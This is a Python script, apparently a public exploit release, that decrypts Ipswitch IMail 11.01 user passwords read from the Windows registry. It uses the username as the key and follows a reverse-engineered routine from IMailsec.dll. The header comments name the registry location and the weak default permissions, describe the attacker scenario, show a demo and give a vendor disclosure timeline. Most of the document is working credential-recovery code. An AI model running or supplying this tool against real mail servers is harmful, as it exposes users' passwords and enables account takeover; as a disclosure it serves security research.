#!/usr/bin/python

##########################################################################
# Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
# Tested on: Windows XP SP3 (Windows version does not matter)
# Description:
# So I reverse engineered the IMail password decryption function in
# IMailsec.dll, located at 0x00563130.
#
# In order to decrypt correctly, you must have the correct username,
# because it is used as a key.
#
# All usernames and passwords are stored in registry, which can be
# found at:
# HKEY_LOCAL_MACHINE\SOFTWARE\Ipswitch\IMail\Domains\[domain name]\Users
# Every registry key under "Users" has a string value named "Password",
# in there you'll find the encrypted password.
#
# By default, Internet Guest Account is granted with "Full Control" to
# the IMail registry, and its directory.  That means if an attacker
# manages to gain code execution (ie.via a web app bug), IMail can be
# his/her next playground.  And IMail users may not be safe.
#
# Demo:
# sinn3r@bt4:~$ ./iMailDecrypt.py admin C8D3D19AA094
# Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
# coded by sinn3r  -  x90.sinner{at}gmail.c0m
# [*] Password = god123
#
# Responsible Disclosure Timeline:
# 1/21/2010  -  IMail vendor contacted
# 1/26/2010  -  Got a reply from the vendor for more vulnerability
#               clarfication.  No fix yet.
# 2/02/2010  -  Received another reply from the vendor: Issues logged for
#               additional research.  No plans for immediate changes.
#               A public advisory was also suggested by the vendor as
#               reference in their tech/KB article.
# 2/04/2010  -  Public Disclosure.  Vendor informed again.
##########################################################################

import sys
import binascii

## Convert the encrypted string to integers for calculation
## Returns the integer version as a list
def convertToInt(data):
        charset = []
        for char in (data):
                tmp = char.encode("hex")
                tmp = int(tmp, 16)
                charset.append(tmp)
        return charset
        

## Decrypt the password
## Returns the decrypted version as a list
def decryptPassword(intUsername, intPassword):
        results = []
        counter = 0
        counter2 = 0
        pwdLength = len(intPassword)
        while counter<pwdLength:
                firstByte = intPassword[counter]
                if firstByte <= 57:             #0x39
                        firstByte -= 48         #0x30
                else:
                        firstByte -= 55         #0x37
                firstByte *= 16                 #SHL 0x40
                secondByte = intPassword[counter+1]
                if secondByte <= 57:            #0x39
                        secondByte -= 48        #0x30
                else:
                        secondByte -= 55        #0x37
                tmp = firstByte + secondByte

                if len(intUsername) <= counter2:
                        counter2 = 0

                if intUsername[counter2] > 54:                  #0x41
                        if intUsername[counter2] < 90:          #5A
                                intUsername[counter2] += 32     #0x20

                tmp -= intUsername[counter2]
                counter2 += 1

                results.append(hex(tmp)[2:])
                counter += 2
        return results

banner = """Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
coded by sinn3r  -  x90.sinner{at}gmail{d0t}c0m"""

print banner

if len(sys.argv) == 3:
        if len(sys.argv[2]) % 2 == 0:
                username = convertToInt(sys.argv[1])
                password = convertToInt(sys.argv[2])
                decryptor = str("".join(decryptPassword(username, password)))
                print "[*] Password = %s" %binascii.unhexlify(decryptor)
        else:
                print "[*] Incorrect Encrypted password length"
else:
        print "[*] Usage: %s <username> <encrypted password>" %sys.argv[0]
